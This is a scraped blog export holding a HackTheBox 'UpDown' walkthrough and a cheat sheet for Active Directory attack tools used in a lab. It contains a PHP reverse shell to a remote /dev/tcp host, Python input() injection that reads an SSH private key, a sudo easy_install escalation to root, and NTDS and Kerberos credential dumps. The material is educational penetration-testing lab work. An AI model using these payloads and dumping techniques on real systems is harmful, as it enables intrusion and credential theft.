[{"content":"","date":"21 January 2023","permalink":"/","section":"0x53CTF","summary":"","title":"0x53CTF"},{"content":"","date":"21 January 2023","permalink":"/tags/easy_install/","section":"Tags","summary":"","title":"easy_install"},{"content":"","date":"21 January 2023","permalink":"/tags/git/","section":"Tags","summary":"","title":"Git"},{"content":"","date":"21 January 2023","permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox"},{"content":" Name: UpDown IP: 10.10.11.177 Defficulty: Medium OS: Linux Author: AB2 Nmap\u003e Nmap # 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0= | 256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI= | 256 5f6e12670a66e8e2b761bec4143ad38e (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Is my Website up ? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Two ports are open.\n22/TCP SSH OpenSSH 8.2p1 And its banner says that this is an Ubuntu Box 80/TCP HTTP Apache httpd 2.4.41 According to the Apache version, this could be an Ubuntu Focal Fossa. Web Enumeration\u003e Web Enumeration # When we go to the http://10.10.11.177/, we can see a domain siteisup.htb. So let\u0026rsquo;s add that to /etc/hosts.\nSubdomain Fuzzing\u003e Subdomain Fuzzing # Found one subdomain. Add that to /etc/hosts as well.\n\u0026gt; ffuf -u http://10.10.11.177/ -H \u0026#34;Host: FUZZ.siteisup.htb\u0026#34; -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -c -mc all -fs 1131 dev [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 7547ms] Direcotory Fuzzing\u003e Direcotory Fuzzing # Found two directories under http://siteisup.htb.\n\u0026gt; dirsearch -u http://siteisup.htb -r [08:32:44] 200 - 0B - /dev/ [08:52:03] 200 - 602B - /dev/.git/ http://siteisup.htb is a website where we can test if websites are up or downed. To confirm that, start a python webserver and put it to the site and press check. And as we assumed, site is checking if the given site is up or downed (by sending a curl request to the given URL). In this case, our site is showing up.\nhttp://siteisup.htb/dev Leads us to nowhere.\nOnce we visit the http://dev.siteisup.htb, it gives us a 403. So that means we have to authenticate somehow in order to view that site.\nBut as we saw earlier, we foud and .git directory. Let\u0026rsquo;s dump that into our local machine using Git-Dumper.\n\u0026gt; python3 -m git_dumper http://siteisup.htb/dev/.git git View all the git commits.\n\u0026gt; git log --oneline 010dcc3 (HEAD -\u0026gt; main, origin/main, origin/HEAD) Delete index.php c8fcc40 Update checker.php f67efd0 Create checker.php ab9bc16 Update changelog.txt 60d2b32 Create admin.php c1998f8 Add admin panel. 35a3801 Update changelog.txt 57af03b Create index.php 354fe06 Delete .htpasswd 8812785 New technique in header to protect our dev vhost. bc4ba79 Update .htaccess 61e5cc0 Update index.php 3d66cd4 Create changelog.txt 4fb1927 Create stylesheet.css 6f89af7 Create index.php 8d1beb1 Create .htpasswd 6ddcc7a Create .htaccess This commit looks interesting.\n8812785 New technique in header to protect our dev vhost. Let\u0026rsquo;s see what they did to protect their dev vhost.\n\u0026gt; git show 8812785 commit 8812785e31c879261050e72e20f298ae8c43b565 Author: Abdou.Y \u0026lt;84577967+ab2pentest@users.noreply.github.com\u0026gt; Date: Wed Oct 20 16:38:54 2021 +0200 New technique in header to protect our dev vhost. diff --git a/.htaccess b/.htaccess index 44ff240..b317ab5 100644 --- a/.htaccess +++ b/.htaccess @@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev \u0026#34;only4dev\u0026#34; Required-Header Order Deny,Allow Deny from All Allow from env=Required-Header + Looks like they are requiring a special header in order to access the http://dev.siteisup.htb. Let\u0026rsquo;s intercept the request from [BurpSuite] and add the special header to see if it is working or not. It looks like we have to add that Special Header to every request that we are sending to the server and that will be a so much pain. So let\u0026rsquo;s automate that with BurpSuite.\nGo to Proxy \u0026gt; Options \u0026gt; Match and Replace and add new header like this. And now we have to use Burp Browser and we can access http://dev.siteisup.htb without any problem.\nLooks like now we can upload files.\nWith the help of the Special-Dev: only4dev Header I found one directory under http://dev.siteisup.htb/.\n\u0026gt; ffuf -request dev.req -request-proto http -w /usr/share/wordlists/dirb/big.txt -c -mc all -fc 403,404 uploads [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 211ms] Foothold [www-data]\u003e Foothold [www-data] # Since we can upload files and we have uploads directory, maybe now we can get a reverse shell with the help of php-reverse-shell.php.\nBut once I tried to upload the shell.php, it said that Extension not allowed. So we have to find allowed extension. So I managed to find some working extensions by fuzzing the extension.\n\u0026gt; ffuf -request upload.req -request-proto http -w extensions.txt -r -c .php [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 248ms] .php7 [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 248ms] .hphp [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 249ms] .ctp [Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 285ms] .inc [Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 286ms] .php2 [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 288ms] .php6 [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 299ms] .php4 [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 311ms] .phtm [Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 341ms] .pgif [Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 348ms] .phps [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 495ms] .phps [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 495ms] .phtml [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 495ms] .php5 [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 506ms] .module [Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 524ms] .htaccess [Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 525ms] .phar [Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 531ms] .pht [Status: 200, Size: 3083, Words: 10, Lines: 13, Duration: 535ms] .shtml [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 560ms] .php3 [Status: 200, Size: 534, Words: 3, Lines: 2, Duration: 561ms] According to the results, we can use .ctp .inc .phtm .pgif .module .htaccess .phar .pht extensions. This is a good example of why you shouldn\u0026rsquo;t be using a blacklist instead of a whitelist.\nAnyways I uploaded the shell.phar to the server and it started to ping all the lines of the payload and after that it imediately deleted shell.phar from the server. So we have to buy some more time to execute out payload. So let\u0026rsquo;s add some invalid URLs to the top of the payload so we can get some more time while the site is trying to check them.\nIf we look for phpinfo(), we can see most of the function that we use to get a reverse shell are disabled.\n\u0026lt;?php phpinfo(); ?\u0026gt; But proc_open() function is not diabled. So we can crafted a script using ChatGPT.\n\u0026lt;?php $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), 2 =\u0026gt; array(\u0026#34;file\u0026#34;, \u0026#34;/tmp/error-output.txt\u0026#34;, \u0026#34;a\u0026#34;) ); $cwd = \u0026#39;/tmp\u0026#39;; $env = array(\u0026#39;some_option\u0026#39; =\u0026gt; \u0026#39;aeiou\u0026#39;); $process = proc_open(\u0026#39;bash\u0026#39;, $descriptorspec, $pipes, $cwd, $env); if (is_resource($process)) { fwrite($pipes[0], \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.16/5369 0\u0026gt;\u0026amp;1\u0026#39;); fclose($pipes[0]); fclose($pipes[1]); } ?\u0026gt; Let\u0026rsquo;s use this payload to get a reverse shell.\nAnd got a reverse shell as the user www-data.\nwww-data@updown:/tmp$ whoami www-data www-data@updown:/tmp$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Looks like we have a user named developer.\nwww-data@updown:/home$ cat /etc/passwd | grep sh root❌0:0:root:/root:/bin/bash sshd❌109:65534::/run/sshd:/usr/sbin/nologin developer❌1002:1002::/home/developer:/bin/bash Privesc [Developer]\u003e Privesc [Developer] # In /home/developer/dev directory, there are two file named siteisup and siteisup_test.py. This siteisup hs SUID bit bind to it. So we could be able to run it as the owner of that file which is developer user. When we view the strings of the siteisup binary, we can see that it is calling the siteisup_test.py file.\n# Keyspace _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u+UH []A\\A]A^A_ Welcome to \u0026#39;siteisup.htb\u0026#39; application /usr/bin/python /home/developer/dev/siteisup_test.py :*3$\u0026#34; GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux # Keyspace Let\u0026rsquo;s look at the siteisup_test.py file.\nimport requests url = input(\u0026#34;Enter URL here:\u0026#34;) page = requests.get(url) if page.status_code == 200: print \u0026#34;Website is up\u0026#34; else: print \u0026#34;Website is down\u0026#34; This is a simple python script. But the interesting part is if we found a script like this which contains input() function like that, we can abuse that to run system command.\nNormally we can run system commands using python like this.\nimport os os.system(\u0026#34;cat /etc/passwd\u0026#34;) But we can make it a oneliner and give it to the input() as the user input and python will execute the system command like this.\n__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /etc/passwd\u0026#39;) So with this, let\u0026rsquo;s try to read the id_rsa of the developer user.\nwww-data@updown:/home/developer/dev$ ./siteisup Welcome to \u0026#39;siteisup.htb\u0026#39; application Enter URL here:__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /home/developer/.ssh/id_rsa\u0026#39;) -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/ S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2 # Keyspace ZSESqGN9EfOnUqvQa317rHnO3moDWTnYDbynVJuiQHlDaSCyf+uaZoCMINSG5IOC/4Sj0v 3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ== -----END OPENSSH PRIVATE KEY----- Now we can login as the developer user and capture the user flag.\ndeveloper@updown:~$ whoami developer developer@updown:~$ id uid=1002(developer) gid=1002(developer) groups=1002(developer) developer@updown:~$ cat user.txt e3b**************************a26 Privesc [Root]\u003e Privesc [Root] # User developer can run /usr/local/bin/easy_install as the root user with no password.\ndeveloper@updown:~$ sudo -l Matching Defaults entries for developer on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User developer may run the following commands on localhost: (ALL) NOPASSWD: /usr/local/bin/easy_install If we look into GTFOBins for easy_install to find PE vector, we can find there is a way we can get a root shell by using easy_install.\nSo let\u0026rsquo;s get a root shell and capture the root flag.\ndeveloper@updown:~$ echo \u0026#34;import os; os.execl(\u0026#39;/bin/sh\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;chmod u+s /bin/bash\u0026#39;)\u0026#34; \u0026gt; setup.py developer@updown:~$ sudo easy_install . WARNING: The easy_install command is deprecated and will be removed in a future version. Processing . Writing /home/developer/setup.cfg Running setup.py -q bdist_egg --dist-dir /home/developer/egg-dist-tmp-tQthF_ developer@updown:~$ ls -la /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash developer@updown:~$ bash -p bash-5.0# whoami root bash-5.0# id uid=1002(developer) gid=1002(developer) euid=0(root) groups=1002(developer) bash-5.0# cat /root/root.txt 880**************************86f ","date":"21 January 2023","permalink":"/posts/htb/updown/","section":"Posts","summary":"Name: UpDown IP: 10.10.11.177 Defficulty: Medium OS: Linux Author: AB2 Nmap\u003e Nmap # 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0= | 256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI= | 256 5f6e12670a66e8e2b761bec4143ad38e (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1 80/tcp open http syn-ack Apache httpd 2.","title":"HackTheBox UpDown"},{"content":"","date":"21 January 2023","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"21 January 2023","permalink":"/tags/proc_open/","section":"Tags","summary":"","title":"proc_open"},{"content":"","date":"21 January 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"enum4linux\u003e enum4linux # \u0026gt; enum4linux [options] ip Usage: /usr/bin/enum4linux [options] ip Options are (like \u0026#34;enum\u0026#34;): -U get userlist -M get machine list* -S get sharelist -P get password policy information -G get group and member list -d be detailed, applies to -U and -S -u user specify username to use (default \u0026#34;\u0026#34;) -p pass specify password to use (default \u0026#34;\u0026#34;) The following options from enum.exe aren\u0026#39;t implemented: -L, -N, -D, -f Additional options: -a Do all simple enumeration (-U -S -G -P -r -o -n -i). This option is enabled if you don\u0026#39;t provide any other options. -h Display this help message and exit -r enumerate users via RID cycling -R range RID ranges to enumerate (default: 500-550,1000-1050, implies -r) -K n Keep searching RIDs until n consective RIDs don\u0026#39;t correspond to a username. Impies RID range ends at 999999. Useful against DCs. -l Get some (limited) info via LDAP 389/TCP (for DCs only) -s file brute force guessing for share names -k user User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none) Used to get sid with \u0026#34;lookupsid known_username\u0026#34; Use commas to try several users: \u0026#34;-k admin,user1,user2\u0026#34; -o Get OS information -i Get printer information -w wrkg Specify workgroup manually (usually found automatically) -n Do an nmblookup (similar to nbtstat) -v Verbose. Shows full commands being run (net, rpcclient, etc.) -A Aggressive. Do write checks on shares etc Kerbrute\u003e Kerbrute # \u0026gt; kerbrute [command] Available Commands: bruteforce Bruteforce username:password combos, from a file or stdin bruteuser Bruteforce a single user\u0026#39;s password from a wordlist help Help about any command passwordspray Test a single password against a list of users userenum Enumerate valid domain usernames via Kerberos version Display version info and quit Flags: --dc string The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS --delay int Delay in millisecond between each attempt. Will always use single thread if set -d, --domain string The full domain to use (e.g. contoso.com) -h, --help help for kerbrute -o, --output string File to write logs to. Optional. --safe Safe mode. Will abort if any user comes back as locked out. Default: FALSE -t, --threads int Threads to use (default 10) -v, --verbose Log failures and errors # Example of enumerating users \u0026gt; kerbrute -d spookysec.local --dc spookysec.local userenum userlist.txt GetNPUsers.py [Impacket]\u003e GetNPUsers.py [Impacket] # usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname] target Queries target domain for users with \u0026#39;Do not require Kerberos preauthentication\u0026#39; set and export their TGTs for cracking positional arguments: target [[domain/]username[:password]] options: -h, --help show this help message and exit -request Requests TGT for users and output them in JtR/hashcat format (default False) -outputfile OUTPUTFILE Output filename to write ciphers in JtR/hashcat format -format {hashcat,john} format to save the AS_REQ of users without pre-authentication. Default is hashcat -usersfile USERSFILE File with user per line to test -ts Adds timestamp to every logging output -debug Turn DEBUG output ON authentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH -no-pass don\u0026#39;t ask for password (useful for -k) -k Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line -aesKey hex key AES key to use for Kerberos Authentication (128 or 256 bits) connection: -dc-ip ip address IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter -dc-host hostname Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used # Example of ASREPRoasting \u0026gt; /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile users.txt Impacket v0.10.1.dev1+20221214.172823.8799a1a - Copyright 2022 Fortra $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:dff1bf6a67888d1b917e3330fb941140$b26e0760068893a8f281029d5c2fdc8e2e819d476f8ac69d84277a4a7c34ba7cc56e2f4593778b710a8d5f127e467347442c9e178aeacc86cff8b84a932e5cdc9d391fe321976ff432c6bc99ca9c66522ba828da7274d94a1ba24d1763d4ced25c9f684a10e41599b3fc4d19e76d371b58fff442c621a22f0ac907f24a6974ddb35fd3d520e65e1b916db08f0d5e7619deadc8e132fd1bc831f94c16e2ba495b208ac1354f5cb3c239d81f284add23d6c5ce66c81a927b4afebaf0b00775043b444555029e899d9c0d95f3f7fbfa3caf2093f987a40672cebb3885af127cd6c921b27410ec4280aa43ec00efef7bfce801cc smbclient\u003e smbclient # \u0026gt; smbclient -U svc-admin --password management2005 -L spookysec.local Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backup Disk C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share Dump the NTDS.dit from target DC\u003e Dump the NTDS.dit from target DC # \u0026gt; crackmapexec smb spookysec.local -u backup -p \u0026#39;backup2517860\u0026#39; --ntds SMB spookysec.local 445 ATTACKTIVEDIREC [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False) SMB spookysec.local 445 ATTACKTIVEDIREC [+] spookysec.local\\backup:backup2517860 SMB spookysec.local 445 ATTACKTIVEDIREC [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied SMB spookysec.local 445 ATTACKTIVEDIREC [+] Dumping the NTDS, this could take a while so go grab a redbull... SMB spookysec.local 445 ATTACKTIVEDIREC Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc::: SMB spookysec.local 445 ATTACKTIVEDIREC Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB spookysec.local 445 ATTACKTIVEDIREC krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538::: SMB spookysec.local 445 ATTACKTIVEDIREC spookysec.local\\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc::: SMB spookysec.local 445 ATTACKTIVEDIREC ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0d77f90fe202899388be5cf7eff2f79e::: SMB spookysec.local 445 ATTACKTIVEDIREC [+] Dumped 18 NTDS hashes to /home/syclops/.cme/logs/ATTACKTIVEDIREC_spookysec.local_2023-01-18_165517.ntds of which 17 were added to the database Extracting hashes from NTDS.dit\u003e Extracting hashes from NTDS.dit # \u0026gt; sudo secretsdump.py spookysec.local/backup:backup2517860@10.10.152.60 Impacket v0.10.1.dev1+20230118.142.d0c05de1 - Copyright 2022 Fortra [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21::: spookysec.local\\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4::: spookysec.local\\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4::: spookysec.local\\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b::: spookysec.local\\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e::: spookysec.local\\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b::: spookysec.local\\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7::: spookysec.local\\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a::: spookysec.local\\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb::: spookysec.local\\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2::: spookysec.local\\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705::: spookysec.local\\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664::: spookysec.local\\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809::: spookysec.local\\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538::: spookysec.local\\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc::: ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0d77f90fe202899388be5cf7eff2f79e::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48 Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae Administrator:des-cbc-md5:2079ce0e5df189ad krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902 krbtgt:des-cbc-md5:b94f97e97fabbf5d spookysec.local\\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04 spookysec.local\\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233 spookysec.local\\skidy:des-cbc-md5:b092a73e3d256b1f spookysec.local\\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5 spookysec.local\\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425 spookysec.local\\breakerofthings:des-cbc-md5:7a976bbfab86b064 spookysec.local\\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112 spookysec.local\\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6 spookysec.local\\james:des-cbc-md5:dc971f4a91dce5e9 spookysec.local\\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe spookysec.local\\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510 spookysec.local\\optional:des-cbc-md5:8c6e2a8a615bd054 spookysec.local\\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd spookysec.local\\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e spookysec.local\\sherlocksec:des-cbc-md5:08dca4cbbc3bb594 spookysec.local\\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499 spookysec.local\\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be spookysec.local\\darkstar:des-cbc-md5:758af4d061381cea spookysec.local\\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067 spookysec.local\\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e spookysec.local\\Ori:des-cbc-md5:1c8f79864654cd4a spookysec.local\\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3 spookysec.local\\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8 spookysec.local\\robin:des-cbc-md5:89a7c2fe7a5b9d64 